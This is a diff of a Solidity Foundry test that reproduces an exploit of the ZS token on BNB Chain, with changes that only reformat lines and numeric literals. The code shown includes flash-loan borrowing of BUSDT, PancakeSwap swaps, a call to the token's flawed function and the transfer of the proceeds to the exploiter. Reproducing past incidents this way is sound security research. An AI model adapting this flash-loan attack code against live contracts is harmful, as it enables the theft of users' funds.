@@ -52,17 +52,13 @@ contract ZSExploit is BaseTestWithBalanceLog {
         AttackContract attackContract = new AttackContract{value: address(this).balance}();
         vm.roll(block.number + 2);
         emit log_named_decimal_uint(
-            "Exploiter BUSDT balance before attack",
-            BUSDT.balanceOf(address(this)),
-            BUSDT.decimals()
+            "Exploiter BUSDT balance before attack", BUSDT.balanceOf(address(this)), BUSDT.decimals()
         );
         // Second tx
         attackContract.exploitZS();
 
         emit log_named_decimal_uint(
-            "Exploiter BUSDT balance after attack",
-            BUSDT.balanceOf(address(this)),
-            BUSDT.decimals()
+            "Exploiter BUSDT balance after attack", BUSDT.balanceOf(address(this)), BUSDT.decimals()
         );
     }
 }
@@ -94,7 +90,7 @@ contract AttackContract is Test {
         path[0] = address(BUSDT);
         path[1] = address(ZS);
         uint256[] memory amountsIn = PancakeRouter.getAmountsIn(ZSAmountOut, path);
-        uint256 flashBUSDTAmount = (amountsIn[0] + 1_000e18) - BUSDT.balanceOf(address(this));
+        uint256 flashBUSDTAmount = (amountsIn[0] + 1000e18) - BUSDT.balanceOf(address(this));
         bytes memory data = abi.encode(flashBUSDTAmount);
         BUSDT_USDC.flash(address(this), flashBUSDTAmount, 0, data);
     }
@@ -104,7 +100,7 @@ contract AttackContract is Test {
         address[] memory path = new address[](2);
         path[0] = address(BUSDT);
         path[1] = address(ZS);
-        uint256[] memory amountsOut = PancakeRouter.getAmountsOut(BUSDT.balanceOf(address(this)) - 1_000e18, path);
+        uint256[] memory amountsOut = PancakeRouter.getAmountsOut(BUSDT.balanceOf(address(this)) - 1000e18, path);
         ZS_BUSDT.swap(amountsOut[1], 0, address(this), bytes("_"));
 
         // Call to flawed function
@@ -120,8 +116,8 @@ contract AttackContract is Test {
         BUSDT.transfer(exploiter, BUSDT.balanceOf(address(this)));
     }
 
-    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
-        BUSDT.transfer(address(ZS_BUSDT), BUSDT.balanceOf(address(this)) - 1_000e18);
+    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        BUSDT.transfer(address(ZS_BUSDT), BUSDT.balanceOf(address(this)) - 1000e18);
     }
 
     function WBNBToBUSDT() private {
@@ -129,10 +125,7 @@ contract AttackContract is Test {
         path[0] = address(WBNB);
         path[1] = address(BUSDT);
         PancakeRouter.swapExactETHForTokens{value: address(this).balance}(
-            0,
-            path,
-            address(this),
-            block.timestamp + 1_000
+            0, path, address(this), block.timestamp + 1000
         );
     }
 
@@ -141,11 +134,7 @@ contract AttackContract is Test {
         path[0] = address(BUSDT);
         path[1] = address(ZS);
         PancakeRouter.swapExactTokensForTokens(
-            BUSDT.balanceOf(address(this)) / 2,
-            0,
-            path,
-            address(this),
-            block.timestamp + 1_000
+            BUSDT.balanceOf(address(this)) / 2, 0, path, address(this), block.timestamp + 1000
         );
     }
 }
